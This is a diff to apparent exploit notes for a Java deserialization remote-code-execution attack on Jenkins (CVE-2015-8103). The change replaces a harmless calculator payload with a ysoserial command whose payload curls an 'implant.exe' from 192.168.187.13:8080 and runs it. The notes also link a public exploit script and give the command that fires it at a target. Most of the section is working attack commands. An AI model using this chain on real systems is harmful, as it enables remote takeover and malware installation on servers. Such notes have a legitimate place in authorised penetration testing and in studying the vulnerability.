@@ -24,8 +24,9 @@
 ## Running the Exploit
 - Generate serialized java payload: https://github.com/frohoff/ysoserial
     - `wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar`
-    - Example payload that executes the calcualtor app on the target:
-    - `java -jar ysoserial-all.jar CommonsCollections7 calc.exe > payload`
+    - Example payload that downloads an implant from 192.168.187.13:8080 and executes it:
+    - `java -jar ysoserial-all.jar CommonsCollections7 "curl 192.168.187.13:8080/implant.exe --output implant.exe && implant.exe" > payload`
+    - ``
 - Python exploit script:
     - https://github.com/gquere/pwn_jenkins/blob/master/rce/jenkins_rce_cve-2015-8103_deser.py
 - Run `python exploit.py [IP] [PORT] /path/to/payload`
